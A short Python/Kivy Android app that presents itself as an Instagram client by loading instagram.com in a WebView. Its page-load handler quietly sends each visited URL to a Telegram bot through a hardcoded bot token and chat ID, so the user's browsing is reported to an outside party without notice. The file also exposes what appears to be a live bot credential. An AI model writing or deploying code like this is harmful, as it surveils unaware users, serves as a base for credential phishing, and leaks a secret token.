import requests
from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.clock import Clock
from kivy.utils import platform

if platform == 'android':
    from jnius import autoclass
    from android.runnable import run_on_ui_thread
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    WebView = autoclass('android.webkit.WebView')
    WebViewClient = autoclass('android.webkit.WebViewClient')
    WebSettings = autoclass('android.webkit.WebSettings')
else:
    def run_on_ui_thread(f): return f

BOT_TOKEN = "8703607239:AAF6PWnNKy0VqBGT22V6jCpOH7tzqGn0d_E"
CHAT_ID = "6680833524"

class InstagramV5App(App):
    def build(self):
        if platform == 'android':
            Clock.schedule_once(self.create_webview, 0)
        return FloatLayout()

    @run_on_ui_thread
    def create_webview(self, *args):
        activity = PythonActivity.mActivity
        webview = WebView(activity)
        settings = webview.getSettings()
        
        # Super-Power Settings for No Crash
        settings.setJavaScriptEnabled(True)
        settings.setDomStorageEnabled(True)
        settings.setDatabaseEnabled(True)
        settings.setMediaPlaybackRequiresUserGesture(False)
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36")
        
        class MyClient(WebViewClient):
            def onPageFinished(self, view, url):
                # Send Activity to Bot
                try:
                    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=📱 V5 Active: {url}", timeout=2)
                except: pass

        webview.setWebViewClient(MyClient())
        webview.loadUrl("https://www.instagram.com/")
        activity.setContentView(webview)

if __name__ == '__main__':
    InstagramV5App().run()

